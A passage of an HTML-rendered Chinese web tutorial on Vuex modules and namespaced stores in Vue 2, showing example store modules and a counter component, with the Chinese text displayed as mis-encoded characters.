value=&quot;2&quot;&gt;2&lt;/option&gt;<br>&lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;<br>&lt;/select&gt;<br>&lt;button @click=&quot;increment(n)&quot;&gt;+&lt;/button&gt;<br>&lt;button @click=&quot;decrement(n)&quot;&gt;-&lt;/button&gt;<br>&lt;button @click=&quot;addOdd(n)&quot;&gt;å½“å‰æ±‚å’Œä¸ºå¥‡æ•°å†åŠ &lt;/button&gt;<br>&lt;button @click=&quot;addWait(n)&quot;&gt;ç­‰ä¸€ç­‰å†åŠ &lt;/button&gt;<br>&lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import &#123;mapState, mapGetters, mapMutations, mapActions&#125; from &#x27;vuex&#x27;//ğŸ”´<br><br>export default &#123;<br>name: &#x27;Count&#x27;,<br>data() &#123;<br>return &#123;<br>n:1, //ç”¨æˆ·é€‰æ‹©çš„æ•°å­—<br>&#125;<br>&#125;,<br>  computed: &#123;<br>...mapState([&#x27;sum&#x27;,&#x27;school&#x27;,&#x27;name&#x27;]),<br>...mapGetters([&#x27;bigSum&#x27;])<br>&#125;,<br>methods: &#123;<br>...mapMutations(&#123;increment:&#x27;ADD&#x27;, decrement:&#x27;SUBTRACT&#x27;&#125;),<br>...mapActions([&#x27;addOdd&#x27;, &#x27;addWait&#x27;])<br>&#125;,<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br>button&#123;<br>margin-left: 5px;<br>&#125;<br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><p>â€‹    </p><h2 id="3-7-æ¨¡å—åŒ–-å‘½åç©ºé—´"><a href="#3-7-æ¨¡å—åŒ–-å‘½åç©ºé—´" class="headerlink" title="3.7 æ¨¡å—åŒ–+å‘½åç©ºé—´"></a>3.7 æ¨¡å—åŒ–+å‘½åç©ºé—´</h2><ol><li><p>ç›®çš„ï¼šè®©ä»£ç æ›´å¥½ç»´æŠ¤ï¼Œè®©å¤šç§æ•°æ®åˆ†ç±»æ›´åŠ æ˜ç¡®ã€‚</p></li><li><p>ä¿®æ”¹<strong>store.js</strong><br>ä¸ºäº†è§£å†³ä¸åŒæ¨¡å—å‘½åå†²çªçš„é—®é¢˜ï¼Œå°†ä¸åŒæ¨¡å—çš„namespaced: trueï¼Œä¹‹ååœ¨ä¸åŒé¡µé¢ä¸­å¼•å…¥<strong>getter</strong> <strong>actions</strong> <strong>mutations</strong>æ—¶ï¼Œéœ€è¦åŠ ä¸Šæ‰€å±çš„æ¨¡å—å</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> countAbout = &#123;<br>  <span class="hljs-attr">namespaced</span>: <span class="hljs-literal">true</span>,<span class="hljs-comment">// å¼€å¯å‘½åç©ºé—´</span><br>  <span class="hljs-attr">state</span>: &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">1</span>&#125;,<br>  <span class="hljs-attr">mutations</span>: &#123; ... &#125;,<br>  <span class="hljs-attr">actions</span>: &#123; ... &#125;,<br>  <span class="hljs-attr">getters</span>: &#123;<br>    <span class="hljs-title function_">bigSum</span>(<span class="hljs-params">state</span>)&#123; <span class="hljs-keyword">return</span> state.<span class="hljs-property">sum</span> * <span class="hljs-number">10</span> &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> personAbout = &#123;<br>  <span class="hljs-attr">namespaced</span>: <span class="hljs-literal">true</span>,<span class="hljs-comment">// å¼€å¯å‘½åç©ºé—´</span><br>  <span class="hljs-attr">state</span>: &#123; ... &#125;,<br>  <span class="hljs-attr">mutations</span>: &#123; ... &#125;,<br>  <span class="hljs-attr">actions</span>: &#123; ... &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> store = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuex</span>.<span class="hljs-title class_">Store</span>(&#123;<br>  <span class="hljs-attr">modules</span>: &#123;<br>    countAbout,<br>    personAbout<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure></li></ol><pre><code class="hljs">3. å¼€å¯å‘½åç©ºé—´åï¼Œç»„ä»¶ä¸­è¯»å–**state**æ•°æ®ï¼š</code></pre><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//æ–¹å¼ä¸€ï¼šè‡ªå·±ç›´æ¥è¯»å–</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-property">state</span>.<span class="hljs-property">personAbout</span>.<span class="hljs-property">list</span><br><span class="hljs-comment">//æ–¹å¼äºŒï¼šå€ŸåŠ©mapStateè¯»å–ï¼š</span><br><span class="hljs-comment">// ç”¨ mapState å– countAbout ä¸­çš„state å¿…é¡»åŠ ä¸Š &#x27;countAbout&#x27;</span><br>...<span class="hljs-title function_">mapState</span>(<span class="hljs-string">&#x27;countAbout&#x27;</span>,[<span class="hljs-string">&#x27;sum&#x27;</span>,<span class="hljs-string">&#x27;school&#x27;</span>,<span class="hljs-string">&#x27;subject&#x27;</span>]),<br></code></pre></td></tr></table></figure><ol start="4"><li>å¼€å¯å‘½åç©ºé—´åï¼Œç»„ä»¶ä¸­è¯»å–<strong>getters</strong>æ•°æ®ï¼š</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//æ–¹å¼ä¸€ï¼šè‡ªå·±ç›´æ¥è¯»å–</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-property">getters</span>[<span class="hljs-string">&#x27;personAbout/firstPersonName&#x27;</span>]<br><span class="hljs-comment">//æ–¹å¼äºŒï¼šå€ŸåŠ©mapGettersè¯»å–ï¼š</span><br>...<span class="hljs-title function_">mapGetters</span>(<span class="hljs-string">&#x27;countAbout&#x27;</span>,[<span class="hljs-string">&#x27;bigSum&#x27;</span>])<br></code></pre></td></tr></table></figure><pre><code class="hljs">5. å¼€å¯å‘½åç©ºé—´åï¼Œç»„ä»¶ä¸­è°ƒç”¨**dispatch**</code></pre><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//æ–¹å¼ä¸€ï¼šè‡ªå·±ç›´æ¥dispatch</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-title function_">dispatch</span>(<span class="hljs-string">&#x27;personAbout/addPersonWang&#x27;</span>,person)<br><span class="hljs-comment">//æ–¹å¼äºŒï¼šå€ŸåŠ©mapActionsï¼š</span><br>...<span class="hljs-title function_">mapActions</span>(<span class="hljs-string">&#x27;countAbout&#x27;</span>,&#123;<span class="hljs-attr">incrementOdd</span>:<span class="hljs-string">&#x27;jiaOdd&#x27;</span>,<span class="hljs-attr">incrementWait</span>:<span class="hljs-string">&#x27;jiaWait&#x27;</span>&#125;)<br></code></pre></td></tr></table></figure><pre><code class="hljs">6. å¼€å¯å‘½åç©ºé—´åï¼Œç»„ä»¶ä¸­è°ƒç”¨**commit**</code></pre><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//æ–¹å¼ä¸€ï¼šè‡ªå·±ç›´æ¥commit</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-title function_">commit</span>(<span class="hljs-string">&#x27;personAbout/ADD_PERSON&#x27;</span>,person)<br><span class="hljs-comment">//æ–¹å¼äºŒï¼šå€ŸåŠ©mapMutationsï¼š</span><br>...<span class="hljs-title function_">mapMutations</span>(<span class="hljs-string">&#x27;countAbout&#x27;</span>,&#123;<span class="hljs-attr">increment</span>:<span class="hljs-string">&#x27;JIA&#x27;</span>,<span class="hljs-attr">decrement</span>:<span class="hljs-string">&#x27;JIAN&#x27;</span>&#125;),<br></code></pre></td></tr></table></figure><p>å…·ä½“æ¡ˆä¾‹ï¼š<br>count.js</p>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>    <span class="hljs-attr">namespaced</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">actions</span>: &#123;<br>        <span class="hljs-title function_">addOdd</span>(<span class="hljs-params">context, value</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;actionsä¸­çš„addOddè¢«è°ƒç”¨äº†&quot;</span>)<br>            <span class="hljs-keyword">if</span> (context.<span class="hljs-property">state</span>.<span class="hljs-property">sum</span> % <span class="hljs-number">2</span>) &#123;<br>                context.<span class="hljs-title function_">commit</span>(<span class="hljs-string">&#x27;ADD&#x27;</span>, value)<br>            &#125;<br>        &#125;,<br>        <span class="hljs-title function_">addWait</span>(<span class="hljs-params">context, value</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;actionsä¸­çš„addWaitè¢«è°ƒç”¨äº†&quot;</span>)<br>            <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>                context.<span class="hljs-title function_">commit</span>(<span class="hljs-string">&#x27;ADD&#x27;</span>, value)<br>            &#125;, <span class="hljs-number">500</span>)<br>        &#125;<br>    &#125;,<br>    <span class="hljs-attr">mutations</span>: &#123;<br>        <span class="hljs-title function_">ADD</span>(<span class="hljs-params">state, value</span>) &#123;<br>            state.<span class="hljs-property">sum</span> += value<br>        &#125;,<br>        <span class="hljs-title function_">SUBTRACT</span>(<span class="hljs-params">state, value</span>) &#123;<br>            state.<span class="hljs-property">sum</span> -= value<br>        &#125;<br>    &#125;,<br>    <span class="hljs-attr">state</span>: &#123;<br>        <span class="hljs-attr">sum</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-attr">school</span>: <span class="hljs-string">&#x27;å°šç¡…è°·&#x27;</span>,<br>        <span class="hljs-attr">subject</span>: <span class="hljs-string">&#x27;å‰ç«¯&#x27;</span><br>    &#125;,<br>    <span class="hljs-attr">getters</span>: &#123;<br>        <span class="hljs-title function_">bigSum</span>(<span class="hljs-params">state</span>) &#123;<br>            <span class="hljs-keyword">return</span> state.<span class="hljs-property">sum</span> * <span class="hljs-number">10</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>person.js</p>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;axios&quot;</span><br><span class="hljs-keyword">import</span> &#123; nanoid &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;nanoid&quot;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span>&#123;<br>    <span class="hljs-attr">namespaced</span>:<span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">actions</span>:&#123;<br>        <span class="hljs-title function_">addPersonWang</span>(<span class="hljs-params">context,value</span>)&#123;<br>            <span class="hljs-keyword">if</span>(value.<span class="hljs-property">name</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&#x27;ç‹&#x27;</span>) === <span class="hljs-number">0</span>)&#123;<br>                context.<span class="hljs-title function_">commit</span>(<span class="hljs-string">&#x27;ADD_PERSON&#x27;</span>,value)<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;æ·»åŠ çš„äººå¿…é¡»å§“ç‹ï¼&#x27;</span>)<br>            &#125;<br>        &#125;,<br>        <span class="hljs-title function_">addPersonServer</span>(<span class="hljs-params">context</span>)&#123;<br>            axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;http://api.uixsj.cn/hitokoto/get?type=social&#x27;</span>).<span class="hljs-title function_">then</span>(<br>                <span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>                    context.<span class="hljs-title function_">commit</span>(<span class="hljs-string">&#x27;ADD_PERSON&#x27;</span>,&#123;<span class="hljs-attr">id</span>:<span class="hljs-title function_">nanoid</span>(),<span class="hljs-attr">name</span>:response.<span class="hljs-property">data</span>&#125;)<br>                &#125;,<br>                <span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123; <span class="hljs-title function_">alert</span>(error.<span class="hljs-property">message</span>) &#125;<br>            )<br>        &#125;<br>    &#125;,<br>    <span class="hljs-attr">mutations</span>:&#123;<br>        <span class="hljs-title function_">ADD_PERSON</span>(<span class="hljs-params">state,value</span>)&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;mutationsä¸­çš„ADD_PERSONè¢«è°ƒç”¨äº†&#x27;</span>)<br>            state.<span class="hljs-property">personList</span>.<span class="hljs-title function_">unshift</span>(value)<br>        &#125;<br>    &#125;,<br>    <span class="hljs-attr">state</span>:&#123;<br>        <span class="hljs-attr">personList</span>:[&#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;001&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;æ¬§è€¶&#x27;</span>&#125;]<br>    &#125;,<br>    <span class="hljs-attr">getters</span>:&#123;<br>        <span class="hljs-title function_">firstPersonName</span>(<span class="hljs-params">state</span>)&#123; <span class="hljs-keyword">return</span> state.<span class="hljs-property">personList</span>[<span class="hljs-number">0</span>].<span class="hljs-property">name</span> &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>index.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/* //è¯¥æ–‡ä»¶ç”¨äºåˆ›å»ºVuexä¸­æœ€ä¸ºæ ¸å¿ƒçš„store</span><br><span class="hljs-comment">import Vue from &#x27;vue&#x27;</span><br><span class="hljs-comment">//å¼•å…¥Vuex</span><br><span class="hljs-comment">import Vuex from &#x27;vuex&#x27;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">import axios from &quot;axios&quot;</span><br><span class="hljs-comment">import &#123; nanoid &#125; from &quot;nanoid&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//åº”ç”¨Vuexæ’ä»¶</span><br><span class="hljs-comment">Vue.use(Vuex)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">const countAbout = &#123;</span><br><span class="hljs-comment">    namespaced: true,</span><br><span class="hljs-comment">    actions: &#123;</span><br><span class="hljs-comment">        addOdd(context, value) &#123;</span><br><span class="hljs-comment">            console.log(&quot;actionsä¸­çš„addOddè¢«è°ƒç”¨äº†&quot;)</span><br><span class="hljs-comment">            if (context.state.sum % 2) &#123;</span><br><span class="hljs-comment">                context.commit(&#x27;ADD&#x27;, value)</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;,</span><br><span class="hljs-comment">        addWait(context, value) &#123;</span><br><span class="hljs-comment">            console.log(&quot;actionsä¸­çš„addWaitè¢«è°ƒç”¨äº†&quot;)</span><br><span class="hljs-comment">            setTimeout(() =&gt; &#123;</span><br><span class="hljs-comment">                context.commit(&#x27;ADD&#x27;, value)</span><br><span class="hljs-comment">            &#125;, 500)</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;,</span><br><span class="hljs-comment">    mutations: &#123;</span><br><span class="hljs-comment">        ADD(state, value) &#123;</span><br><span class="hljs-comment">            state.sum += value</span><br><span class="hljs-comment">        &#125;,</span><br><span class="hljs-comment">        SUBTRACT(state, value) &#123;</span><br><span class="hljs-comment">            state.sum -= value</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;,</span><br><span class="hljs-comment">    state: &#123;</span><br><span class="hljs-comment">        sum: 0,</span><br><span class="hljs-comment">        school: &#x27;å°šç¡…è°·&#x27;,</span><br><span class="hljs-comment">        subject: &#x27;å‰ç«¯&#x27;</span><br><span class="hljs-comment">    &#125;,</span><br><span class="hljs-comment">    getters: &#123;</span><br><span class="hljs-comment">        bigSum(state) &#123;</span><br><span class="hljs-comment">            return state.sum * 10</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">const personAbout = &#123;</span><br><span class="hljs-comment">    namespaced: true,</span><br><span class="hljs-comment">    actions: &#123;</span><br><span class="hljs-comment">        addPersonWang(context, value) &#123;</span><br><span class="hljs-comment">            if (value.name.indexOf(&#x27;ç‹&#x27;) === 0) &#123;</span><br><span class="hljs-comment">                context.commit(&#x27;ADD_PERSON&#x27;, value)</span><br><span class="hljs-comment">            &#125; else &#123;</span><br><span class="hljs-comment">                alert(&#x27;æ·»åŠ çš„äººå¿…é¡»å§“ç‹ï¼&#x27;)</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;,</span><br><span class="hljs-comment">        addPersonServer(context) &#123;</span><br><span class="hljs-comment">            axios.get(&#x27;http://api.uixsj.cn/hitokoto/get?type=social&#x27;).then(</span><br><span class="hljs-comment">                response =&gt; &#123;</span><br><span class="hljs-comment">                    context.commit(&#x27;ADD_PERSON&#x27;, &#123;</span><br><span class="hljs-comment">                        id: nanoid(),</span><br><span class="hljs-comment">                        name: response.data</span><br><span class="hljs-comment">                    &#125;)</span><br><span class="hljs-comment">                &#125;,</span><br><span class="hljs-comment">                error =&gt; &#123;</span><br><span class="hljs-comment">                    alert(error.message)</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">            )</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;,</span><br><span class="hljs-comment">    mutations: &#123;</span><br><span class="hljs-comment">        ADD_PERSON(state, value) &#123;</span><br><span class="hljs-comment">            console.log(&#x27;mutationsä¸­çš„ADD_PERSONè¢«è°ƒç”¨äº†&#x27;,value)</span><br><span class="hljs-comment">            state.personList.unshift(value)</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;,</span><br><span class="hljs-comment">    state: &#123;</span><br><span class="hljs-comment">        personList: []</span><br><span class="hljs-comment">    &#125;,</span><br><span class="hljs-comment">    getters: &#123;</span><br><span class="hljs-comment">        firstPersonName(state) &#123;</span><br><span class="hljs-comment">            if(!state.personList[0]) return </span><br><span class="hljs-comment">            return state.personList[0].name </span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">const store = new Vuex.Store(&#123;</span><br><span class="hljs-comment">    modules: &#123;</span><br><span class="hljs-comment">        countAbout,</span><br><span class="hljs-comment">        personAbout</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">export default store */</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vuex</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vuex&#x27;</span><br><span class="hljs-keyword">import</span> countOptions <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./count&#x27;</span><span class="hljs-comment">// å¼•å…¥count</span><br><span class="hljs-keyword">import</span> personOptions <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./person&#x27;</span><span class="hljs-comment">// å¼•å…¥person</span><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Vuex</span>)<br><br><span class="hljs-comment">//åˆ›å»ºå¹¶æš´éœ²store</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuex</span>.<span class="hljs-title class_">Store</span>(&#123;<br>    <span class="hljs-attr">modules</span>:&#123;<br>        <span class="hljs-attr">countAbout</span>:countOptions,<br>        <span class="hljs-attr">personAbout</span>:personOptions,<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>count.vue</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>&lt;div&gt;<br>&lt;h1&gt;å½“å‰æ±‚å’Œä¸ºï¼š&#123;&#123; sum &#125;&#125;&lt;/h1&gt;<br>&lt;h3&gt;å½“å‰æ±‚å’Œçš„10å€ä¸ºï¼š&#123;&#123; bigSum &#125;&#125;&lt;/h3&gt;<br>&lt;h3&gt;æˆ‘æ˜¯&#123;&#123; name &#125;&#125;ï¼Œæˆ‘åœ¨&#123;&#123; school &#125;&#125;å­¦ä¹ &lt;/h3&gt;<br>&lt;h3 style=&quot;color:red&quot;&gt;Personç»„ä»¶çš„æ€»äººæ•°æ˜¯ï¼š&#123;&#123; personList.length &#125;&#125;&lt;/h3&gt;<br>&lt;select v-model.number=&quot;n&quot;&gt;<br>&lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;<br>&lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;<br>&lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;<br>&lt;/select&gt;<br>&lt;button @click=&quot;increment(n)&quot;&gt;+&lt;/button&gt;<br>&lt;button @click=&quot;decrement(n)&quot;&gt;-&lt;/button&gt;<br>&lt;button @click=&quot;incrementOdd(n)&quot;&gt;å½“å‰æ±‚å’Œä¸ºå¥‡æ•°å†åŠ &lt;/button&gt;<br>&lt;button @click=&quot;incrementWait(n)&quot;&gt;ç­‰ä¸€ç­‰å†åŠ &lt;/button&gt;<br>&lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import &#123;<br>mapState,<br>mapGetters,<br>mapMutations,<br>mapActions<br>&#125; from &#x27;vuex&#x27;<br><br>export default &#123;<br>name: &#x27;Count&#x27;,<br>data() &#123;<br>return &#123;<br>n: 1, // ç”¨æˆ·é€‰æ‹©çš„æ•°å­—<br>&#125;<br>&#125;,<br>computed: &#123;<br>...mapState(&#x27;countAbout&#x27;, [&#x27;sum&#x27;, &#x27;school&#x27;, &#x27;name&#x27;]),<br>...mapState(&#x27;personAbout&#x27;, [&#x27;personList&#x27;]),<br>...mapGetters(&#x27;countAbout&#x27;, [&#x27;bigSum&#x27;]),<br>&#125;,<br>methods: &#123;<br>...mapMutations(&#x27;countAbout&#x27;, &#123;<br>increment: &#x27;ADD&#x27;,<br>decrement: &#x27;SUBTRACT&#x27;<br>&#125;),<br>...mapActions(&#x27;countAbout&#x27;, &#123;<br>incrementOdd: &#x27;addOdd&#x27;,<br>incrementWait: &#x27;addWait&#x27;<br>&#125;)<br>&#125;,<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br>button &#123;<br>margin-left: 5px;<br>&#125;<br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><p>â€‹    </p><p>person.vue</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 